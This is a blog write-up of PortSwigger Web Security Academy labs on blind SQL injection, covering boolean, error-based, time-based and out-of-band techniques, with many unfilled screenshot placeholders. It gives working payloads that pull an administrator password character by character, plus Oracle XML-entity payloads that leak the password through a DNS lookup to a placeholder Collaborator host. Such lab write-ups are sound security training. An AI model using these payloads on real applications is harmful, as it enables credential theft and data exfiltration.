---
title: "PortSwigger SQL Injection Labs — Part 4: Blind SQL Injection"
date: 2026-09-22 06:30:00 +0000
categories: [Web Penetration Testing]
tags: [SQL Injection, PortSwigger, Web Security Academy, Blind SQLi]
description: "Exploiting blind SQL injection with boolean responses, conditional errors, time delays and out-of-band (OAST) interactions."
author: Paschal Sangawe
toc: true
---

Blind SQL injection is the case where the query result never comes back in the response. We cannot simply `UNION SELECT` the data, because there is nothing rendered. Instead we ask the database true/false questions and observe a side channel: a change in the page, a conditional error, a delay, or an out-of-band request. This part covers labs 11–16.

All six labs use the same primitive — a `TrackingId` cookie that is concatenated into an analytics query:

```sql
SELECT ... FROM ... WHERE trackingId = '<cookie value>'
```

## Lab 11 — Blind SQL injection with conditional responses
> **Picture goes here (#1).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `TrackingId=xyz' AND '1'='1`.
> _Save as_ `images/portswigger-sqli-part-4-blind-sql-injection/1.png` _then replace this block with_ `![Lab 11 — Blind SQL injection with conditional responses](/images/portswigger-sqli-part-4-blind-sql-injection/1.png)`_._


**Difficulty:** Practitioner
**Database:** MySQL
**Goal:** Extract the administrator password and log in.

The page shows a "Welcome back" message only when the analytics query returns rows. We can turn that into a boolean oracle.

**Confirm the oracle:**

```sql
TrackingId=xyz' AND '1'='1
TrackingId=xyz' AND '1'='2
```

> **Picture goes here (#2).** Capture this request/response or command step in Burp/terminal. Key line: `TrackingId=xyz' AND '1'='1`.
> _Save as_ `images/portswigger-sqli-part-4-blind-sql-injection/2.png` _then replace this block with_ `![Lab 11 — Blind SQL injection with conditional responses](/images/portswigger-sqli-part-4-blind-sql-injection/2.png)`_._


The first shows "Welcome back"; the second does not. Now confirm the `users` table and the administrator user exist:

```sql
TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a
```

> **Picture goes here (#3).** Capture this request/response or command step in Burp/terminal. Key line: `TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a`.
> _Save as_ `images/portswigger-sqli-part-4-blind-sql-injection/3.png` _then replace this block with_ `![Lab 11 — Blind SQL injection with conditional responses](/images/portswigger-sqli-part-4-blind-sql-injection/3.png)`_._


**Find the password length:**

```sql
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
```

> **Picture goes here (#4).** Capture this request/response or command step in Burp/terminal. Key line: `TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(passw`.
> _Save as_ `images/portswigger-sqli-part-4-blind-sql-injection/4.png` _then replace this block with_ `![Lab 11 — Blind SQL injection with conditional responses](/images/portswigger-sqli-part-4-blind-sql-injection/4.png)`_._


Increment the number until the condition goes false. Here the password is 20 characters.

**Extract the password character by character.** Use `SUBSTRING()` and Burp Intruder:

```sql
TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§
```

> **Picture goes here (#5).** Capture this request/response or command step in Burp/terminal. Key line: `TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrat`.
> _Save as_ `images/portswigger-sqli-part-4-blind-sql-injection/5.png` _then replace this block with_ `![Lab 11 — Blind SQL injection with conditional responses](/images/portswigger-sqli-part-4-blind-sql-injection/5.png)`_._


- Payload position: the character after `='`.
- Payload list: `a–z` and `0–9` (the lab guarantees lowercase alphanumerics).
- Grep-Match on `Welcome back`; the row with a hit reveals the character.
- Increment the `SUBSTRING` offset (`1,1` → `2,1` …) for each position.

> **Picture goes here (#6).** Burp Intruder results with the `Welcome back` grep column ticked for exactly one payload.
> _Save as_ `images/portswigger-sqli-part-4-blind-sql-injection/6.png` _then replace this block with_ `![Lab 11 — Blind SQL injection with conditional responses](/images/portswigger-sqli-part-4-blind-sql-injection/6.png)`_._

## Lab 12 — Blind SQL injection with conditional errors
> **Picture goes here (#7).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `TrackingId=xyz'                                  -- error`.
> _Save as_ `images/portswigger-sqli-part-4-blind-sql-injection/7.png` _then replace this block with_ `![Lab 12 — Blind SQL injection with conditional errors](/images/portswigger-sqli-part-4-blind-sql-injection/7.png)`_._


**Difficulty:** Practitioner
**Database:** Oracle
**Goal:** Same as Lab 11, but the only signal is whether a SQL error occurs.

First confirm the injection and the database:

```sql
TrackingId=xyz'                                  -- error
TrackingId=xyz''                                 -- no error
TrackingId=xyz'||(SELECT '' FROM dual)||'         -- resolves the error (Oracle needs a FROM)
TrackingId=xyz'||(SELECT '' FROM not-a-real-table)||'  -- error again
TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'   -- no error => users exists
```

> **Picture goes here (#8).** Capture this request/response or command step in Burp/terminal. Key line: `TrackingId=xyz'                                  -- error`.
> _Save as_ `images/portswigger-sqli-part-4-blind-sql-injection/8.png` _then replace this block with_ `![Lab 12 — Blind SQL injection with conditional errors](/images/portswigger-sqli-part-4-blind-sql-injection/8.png)`_._


Now build a conditionally-erroring subquery with `CASE` and a divide-by-zero:

```sql
TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```

> **Picture goes here (#9).** Capture this request/response or command step in Burp/terminal. Key line: `TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'`.
> _Save as_ `images/portswigger-sqli-part-4-blind-sql-injection/9.png` _then replace this block with_ `![Lab 12 — Blind SQL injection with conditional errors](/images/portswigger-sqli-part-4-blind-sql-injection/9.png)`_._


Change `1=1` to `1=2` and the error disappears — we now have a per-condition error oracle. Confirm the administrator exists:

```sql
TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

> **Picture goes here (#10).** Capture this request/response or command step in Burp/terminal. Key line: `TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE us`.
> _Save as_ `images/portswigger-sqli-part-4-blind-sql-injection/10.png` _then replace this block with_ `![Lab 12 — Blind SQL injection with conditional errors](/images/portswigger-sqli-part-4-blind-sql-injection/10.png)`_._


**Find the length:**

```sql
TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

> **Picture goes here (#11).** Capture this request/response or command step in Burp/terminal. Key line: `TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN TO_CHAR(1/0) ELSE '' END FROM u`.
> _Save as_ `images/portswigger-sqli-part-4-blind-sql-injection/11.png` _then replace this block with_ `![Lab 12 — Blind SQL injection with conditional errors](/images/portswigger-sqli-part-4-blind-sql-injection/11.png)`_._


**Extract each character** by moving the comparison into the `CASE` and using `SUBSTR()`:

```sql
TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

> **Picture goes here (#12).** Capture this request/response or command step in Burp/terminal. Key line: `TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='§a§' THEN TO_CHAR(1/0) ELSE '' EN`.
> _Save as_ `images/portswigger-sqli-part-4-blind-sql-injection/12.png` _then replace this block with_ `![Lab 12 — Blind SQL injection with conditional errors](/images/portswigger-sqli-part-4-blind-sql-injection/12.png)`_._


Use Burp Intruder with a simple `a–z0–9` list; the correct character produces HTTP 500, the rest HTTP 200, so the Status column finds it instantly.

> **Picture goes here (#13).** Intruder results sorted by status, showing the single 500 response per position.
> _Save as_ `images/portswigger-sqli-part-4-blind-sql-injection/13.png` _then replace this block with_ `![Lab 12 — Blind SQL injection with conditional errors](/images/portswigger-sqli-part-4-blind-sql-injection/13.png)`_._

## Lab 13 — Blind SQL injection with time delays
> **Picture goes here (#14).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `TrackingId=x'||pg_sleep(10)--`.
> _Save as_ `images/portswigger-sqli-part-4-blind-sql-injection/14.png` _then replace this block with_ `![Lab 13 — Blind SQL injection with time delays](/images/portswigger-sqli-part-4-blind-sql-injection/14.png)`_._


**Difficulty:** Practitioner
**Database:** PostgreSQL
**Goal:** Cause a 10 second delay.

When the response gives no boolean or error signal, we can still measure time. PostgreSQL provides `pg_sleep()`:

```sql
TrackingId=x'||pg_sleep(10)--
```

> **Picture goes here (#15).** Capture this request/response or command step in Burp/terminal. Key line: `TrackingId=x'||pg_sleep(10)--`.
> _Save as_ `images/portswigger-sqli-part-4-blind-sql-injection/15.png` _then replace this block with_ `![Lab 13 — Blind SQL injection with time delays](/images/portswigger-sqli-part-4-blind-sql-injection/15.png)`_._


The application takes 10 seconds to respond. Time-based blind is the fallback when nothing is reflected, but it is slower and noisier.

Other databases: MySQL `SLEEP(10)`, Microsoft SQL Server `WAITFOR DELAY '0:0:10'`, Oracle `dbms_pipe.receive_message(('a'),10)`.

> **Picture goes here (#16).** Capture the response/output that proves this works (Burp response, terminal output, or browser result).
> _Save as_ `images/portswigger-sqli-part-4-blind-sql-injection/16.png` _then replace this block with_ `![Lab 13 — Blind SQL injection with time delays](/images/portswigger-sqli-part-4-blind-sql-injection/16.png)`_._

## Lab 14 — Blind SQL injection with time delays and information retrieval
> **Picture goes here (#17).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `TrackingId=x';SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--`.
> _Save as_ `images/portswigger-sqli-part-4-blind-sql-injection/17.png` _then replace this block with_ `![Lab 14 — Blind SQL injection with time delays and information retrieval](/images/portswigger-sqli-part-4-blind-sql-injection/17.png)`_._


**Difficulty:** Practitioner
**Database:** PostgreSQL
**Goal:** Extract the administrator password using timing only.

Build a conditional delay with `CASE` (URL-encoded `;` is `%3B`, `'` is `%27`; below shown with `%3B` for the stacked query):

```sql
TrackingId=x';SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
TrackingId=x';SELECT CASE WHEN (1=2) THEN pg_sleep(10) ELSE pg_sleep(0) END--
```

> **Picture goes here (#18).** Capture this request/response or command step in Burp/terminal. Key line: `TrackingId=x';SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--`.
> _Save as_ `images/portswigger-sqli-part-4-blind-sql-injection/18.png` _then replace this block with_ `![Lab 14 — Blind SQL injection with time delays and information retrieval](/images/portswigger-sqli-part-4-blind-sql-injection/18.png)`_._


Confirm the administrator row:

```sql
TrackingId=x';SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```

> **Picture goes here (#19).** Capture this request/response or command step in Burp/terminal. Key line: `TrackingId=x';SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(`.
> _Save as_ `images/portswigger-sqli-part-4-blind-sql-injection/19.png` _then replace this block with_ `![Lab 14 — Blind SQL injection with time delays and information retrieval](/images/portswigger-sqli-part-4-blind-sql-injection/19.png)`_._


**Find the length:**

```sql
TrackingId=x';SELECT CASE WHEN (username='administrator' AND LENGTH(password)>1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```

> **Picture goes here (#20).** Capture this request/response or command step in Burp/terminal. Key line: `TrackingId=x';SELECT CASE WHEN (username='administrator' AND LENGTH(password)>1) THEN pg_s`.
> _Save as_ `images/portswigger-sqli-part-4-blind-sql-injection/20.png` _then replace this block with_ `![Lab 14 — Blind SQL injection with time delays and information retrieval](/images/portswigger-sqli-part-4-blind-sql-injection/20.png)`_._


**Extract each character:**

```sql
TrackingId=x';SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='§a§') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```

> **Picture goes here (#21).** Capture this request/response or command step in Burp/terminal. Key line: `TrackingId=x';SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='§a§'`.
> _Save as_ `images/portswigger-sqli-part-4-blind-sql-injection/21.png` _then replace this block with_ `![Lab 14 — Blind SQL injection with time delays and information retrieval](/images/portswigger-sqli-part-4-blind-sql-injection/21.png)`_._


In Burp Intruder:

- Set **Maximum concurrent requests to 1** in the resource pool so timing measurements are not distorted by parallel requests.
- Watch the "Response received" column: the correct character takes roughly 10,000 ms.

> **Picture goes here (#22).** Intruder results with one row near 10 s in the "Response received" column.
> _Save as_ `images/portswigger-sqli-part-4-blind-sql-injection/22.png` _then replace this block with_ `![Lab 14 — Blind SQL injection with time delays and information retrieval](/images/portswigger-sqli-part-4-blind-sql-injection/22.png)`_._

## Lab 15 — Blind SQL injection with out-of-band interaction
> **Picture goes here (#23).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8`.
> _Save as_ `images/portswigger-sqli-part-4-blind-sql-injection/23.png` _then replace this block with_ `![Lab 15 — Blind SQL injection with out-of-band interaction](/images/portswigger-sqli-part-4-blind-sql-injection/23.png)`_._


**Difficulty:** Practitioner
**Database:** Oracle
**Goal:** Trigger a DNS lookup to Burp Collaborator.

When the query runs asynchronously and gives no page, error or timing signal, out-of-band application security testing (OAST) is the way in. On Oracle we can abuse `EXTRACTVALUE` with an XML external entity that resolves to a Collaborator domain:

```sql
TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
```

> **Picture goes here (#24).** Capture this request/response or command step in Burp/terminal. Key line: `TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8`.
> _Save as_ `images/portswigger-sqli-part-4-blind-sql-injection/24.png` _then replace this block with_ `![Lab 15 — Blind SQL injection with out-of-band interaction](/images/portswigger-sqli-part-4-blind-sql-injection/24.png)`_._


Replace `BURP-COLLABORATOR-SUBDOMAIN` with a real Collaborator subdomain (in Burp: right-click → *Insert Collaborator payload*), send the request, then poll Collaborator for a DNS/HTTP interaction.

> **Using Community Edition:** Burp Collaborator needs Professional. You can use a self-hosted OAST server such as `interactsh` (`interactsh-client`) or `canarytokens.org` and substitute its hostname.

> **Picture goes here (#25).** Capture the response/output that proves this works (Burp response, terminal output, or browser result).
> _Save as_ `images/portswigger-sqli-part-4-blind-sql-injection/25.png` _then replace this block with_ `![Lab 15 — Blind SQL injection with out-of-band interaction](/images/portswigger-sqli-part-4-blind-sql-injection/25.png)`_._

## Lab 16 — Blind SQL injection with out-of-band data exfiltration
> **Picture goes here (#26).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8`.
> _Save as_ `images/portswigger-sqli-part-4-blind-sql-injection/26.png` _then replace this block with_ `![Lab 16 — Blind SQL injection with out-of-band data exfiltration](/images/portswigger-sqli-part-4-blind-sql-injection/26.png)`_._


**Difficulty:** Practitioner
**Database:** Oracle
**Goal:** Leak the administrator password through a DNS lookup.

Same technique, but instead of a static Collaborator host we prepend the data:

```sql
TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
```

> **Picture goes here (#27).** Capture this request/response or command step in Burp/terminal. Key line: `TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8`.
> _Save as_ `images/portswigger-sqli-part-4-blind-sql-injection/27.png` _then replace this block with_ `![Lab 16 — Blind SQL injection with out-of-band data exfiltration](/images/portswigger-sqli-part-4-blind-sql-injection/27.png)`_._


The database performs a DNS lookup for `<password>.your-collaborator-domain`. Poll Collaborator; the password appears as the subdomain of the interaction. Log in as administrator.

> **Picture goes here (#28).** Collaborator interaction list where the subdomain contains the exfiltrated password.
> _Save as_ `images/portswigger-sqli-part-4-blind-sql-injection/28.png` _then replace this block with_ `![Lab 16 — Blind SQL injection with out-of-band data exfiltration](/images/portswigger-sqli-part-4-blind-sql-injection/28.png)`_._

## Takeaways

- Pick the cheapest available channel first: boolean → error → timing → OAST.
- Boolean and error oracles let you binary-search or brute force a single character at a time; automate with Intruder and deterministic grep/status matching.
- On timing attacks, force a single-threaded resource pool or the delays blur together.
- When everything else is quiet, OAST (Collaborator/interactsh) can both confirm the bug and exfiltrate data.

Next: [Part 5 — WAF Bypass with XML Encoding](/posts/portswigger-sqli-part-5-filter-bypass-xml-encoding/).
